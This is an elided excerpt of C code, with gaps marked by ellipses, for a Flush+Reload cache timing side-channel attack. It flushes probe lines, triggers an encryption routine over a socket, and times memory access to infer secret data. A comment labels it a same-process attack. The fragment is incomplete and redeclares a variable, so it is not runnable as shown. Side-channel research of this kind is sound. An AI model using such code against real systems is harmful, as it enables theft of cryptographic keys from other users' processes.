...
// enable for same-process attack
...
int enable_flush_reload = 0;
int thread_running = 0;
pthread_cond_t      cond  = PTHREAD_COND_INITIALIZER;
pthread_mutex_t     mutex = PTHREAD_MUTEX_INITIALIZER;

void set_affinity(long thread_id, int cpu_id){
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu_id,&mask);
...
{
    if (enable_flush_reload) {
        if (delta <= flush_reload_threshold) {
            return 0;
        }
        else {
            return 1;
...
int main(int argc, char *argv[])
{
    ...
    if (argc > 2) {
        enable_flush_reload = 1;
        int val = atoi(argv[2]);
        if (val > 1) {
            flush_reload_threshold = val;
        }
    }
    ...
    int delta = measure_access_latency(probe[0]);
    ...
    flush(probe[1]);
    func(sockfd, plaintext, ciphertext);
    int delta = measure_access_latency(probe[1]);
    ...
    flush(probe[2]);
    func(sockfd, plaintext, ciphertext);
    int delta = measure_access_latency(probe[2]);
    ...
    flush(probe[3]);
    func(sockfd, plaintext, ciphertext);
    int delta = measure_access_latency(probe[3]);    
